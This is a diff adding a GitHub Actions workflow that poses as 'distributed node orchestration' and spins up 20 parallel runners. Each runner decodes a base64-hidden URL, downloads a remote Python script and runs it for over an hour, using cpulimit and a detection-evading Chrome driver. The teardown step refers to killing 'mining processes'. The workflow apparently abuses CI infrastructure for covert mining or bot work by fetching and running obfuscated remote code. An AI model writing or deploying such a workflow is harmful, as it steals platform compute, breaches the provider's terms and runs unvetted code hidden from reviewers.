@@ -1,0 +1,85 @@
+name: Distributed Linux Nodes Orchestration
+
+on:
+  repository_dispatch:
+    types: [run-task]
+  workflow_dispatch:
+
+concurrency:
+  group: distributed-nodes-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  activate-nodes:
+    name: "ComputeUnit-${{ matrix.unit_id }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      # ═══════════════════════════════════════════════════════════════
+      # (١) تثبيت الأساسيات وتحديث النظام
+      # ═══════════════════════════════════════════════════════════════
+      - name: Prepare Compute Unit Basics
+        run: |
+          echo "[BASICS] Bringing up Compute Unit ${{ matrix.unit_id }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y cpulimit curl python3-pip
+
+      # ═══════════════════════════════════════════════════════════════
+      # (٢) تنزيل الملف التنفيذي الأساسي
+      # ═══════════════════════════════════════════════════════════════
+      - name: Obtain Main Script File
+        run: |
+          echo "[OBTAIN] Retrieving app_task.py from remote endpoint..."
+          REMOTE_ASSET=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QvYWFhL3Jlc29sdmUvbWFpbi9zdGFydC5weQ==" | base64 --decode)
+          curl -sL "$REMOTE_ASSET" -o app_task.py
+          echo "[OBTAIN] Main script retrieved successfully."
+
+      # ═══════════════════════════════════════════════════════════════
+      # (٣) تركيب مكتبات بايثون المطلوبة
+      # ═══════════════════════════════════════════════════════════════
+      - name: Add Required Python Extras
+        run: |
+          echo "[EXTRAS] Adding Python dependencies..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # ═══════════════════════════════════════════════════════════════
+      # (٤) تنفيذ المهمة مع نظام حماية زمني
+      # ═══════════════════════════════════════════════════════════════
+      - name: Launch Task with Time Sentry
+        run: |
+          echo ">> Booting workload on Compute Unit ${{ matrix.unit_id }}..."
+          
+          # إطلاق العملية في الخلفية
+          python3 app_task.py &
+          UNIT_PID=$!
+          
+          echo ">> Time sentry deployed. Allowed window: 74 minutes."
+          
+          # انتظار حتى استنفاد المهلة
+          sleep 4440
+          
+          # فحص العملية وإيقافها إن كانت لا تزال نشطة
+          if kill -0 $UNIT_PID 2>/dev/null; then
+            echo ">> Allowed window expired! Halting workload..."
+            kill -9 $UNIT_PID
+            echo ">> Workload halted."
+          else
+            echo ">> Workload completed within the allowed window."
+          fi
+
+      # ═══════════════════════════════════════════════════════════════
+      # (٥) تفكيك الموارد وإغلاق الوحدة
+      # ═══════════════════════════════════════════════════════════════
+      - name: Teardown and Release Resources
+        run: |
+          echo "[TEARDOWN] Compute Unit ${{ matrix.unit_id }} is wrapping up."
+          echo "[TEARDOWN] Releasing leftover cpulimit and mining processes..."
+          sudo pkill -f cpulimit || true
+          sudo pkill -f systemd-logind || true
+          echo "[RELEASED] Compute Unit ${{ matrix.unit_id }} released cleanly."
